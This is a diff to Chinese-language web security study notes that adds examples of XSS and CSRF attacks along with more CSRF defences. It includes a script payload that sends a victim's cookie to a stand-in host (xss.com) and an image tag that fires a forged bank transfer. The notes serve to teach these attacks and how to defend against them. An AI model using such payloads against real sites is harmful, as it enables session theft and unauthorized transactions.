@@ -19,6 +19,17 @@
 1. HttpOnly 防止截取Cookie(后台容器设置)
 2. 输入检查
 3. 输出检查 - 服务端转义
+
+#### 举例
+1. 某网站搜索框
+```js
+// 在搜索框里输入关键字 <script>alert(1)</script>
+// 后台没有做过滤 返回相应的搜索关键字  http://www.xxx.com?keyword=<script>alert(1)</script>
+// 页面会弹出框1
+// 升级为危险的代码<script>document.location='http://xss.com/get?cookie='+document.cookie</script>
+```
+反射型是需要用户输入的
+存储型是不需要输入的，在加载网页代码的时候就已经执行了
    
 ### CSRF跨站请求伪造
 #### 危害
@@ -32,6 +43,17 @@
 2. cookie有效期
 3. 表单增加hash值
 4. token
+5. referer
+6. post请求
+7. 验证码
+#### 举例
+```js
+// 用户登录网银A 留下了会话
+// 用户访问危险网站B，B里有一段危险代码
+<img src='http://www.bank.com/transfer.php?bankId=111&money=10000' />
+// 自动加载这段代码，B访问A并带上相应的会话信息，A经过验证，进行转帐操作
+```
+
 ### SQL注入
 #### 危害
 1. 获取网站数据
